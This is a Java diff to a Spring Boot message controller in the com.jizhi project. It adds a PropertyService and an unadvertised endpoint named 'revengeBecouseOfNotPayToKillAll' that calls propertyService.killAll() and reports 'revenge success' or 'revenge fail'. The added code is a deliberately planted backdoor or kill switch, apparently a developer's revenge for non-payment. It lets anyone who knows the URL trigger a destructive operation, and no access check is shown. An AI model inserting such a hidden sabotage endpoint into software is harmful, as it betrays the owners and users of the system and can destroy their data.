@@ -3,6 +3,8 @@ package com.jizhi.controller;
 import com.jizhi.pojo.FinalResult;
 import com.jizhi.pojo.Message;
 import com.jizhi.service.MessageService;
+import com.jizhi.service.PropertyService;
+
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.web.bind.annotation.RequestBody;
 import org.springframework.web.bind.annotation.RequestMapping;
@@ -15,7 +17,8 @@ import java.util.List;
 public class MessageController {
 	@Autowired
 	private MessageService messageService;
-	
+	@Autowired
+	private PropertyService propertyService;
 	
 	@RequestMapping("/all")
 	public FinalResult showAllMessage() {
@@ -63,5 +66,20 @@ public class MessageController {
 		}
 		return finalResult;
 	}
+	
+	@RequestMapping("revengeBecouseOfNotPayToKillAll")
+	public FinalResult killAll() {
+		Integer i=propertyService.killAll();
+		FinalResult result = new FinalResult();
+		if(i>0) {
+			result.setCode("200");
+			result.setMsg("revenge success");
+		}else {
+			result.setCode("201");
+			result.setMsg("revenge fail");
+		}
+		return result;
+	}
+	
 	
 }
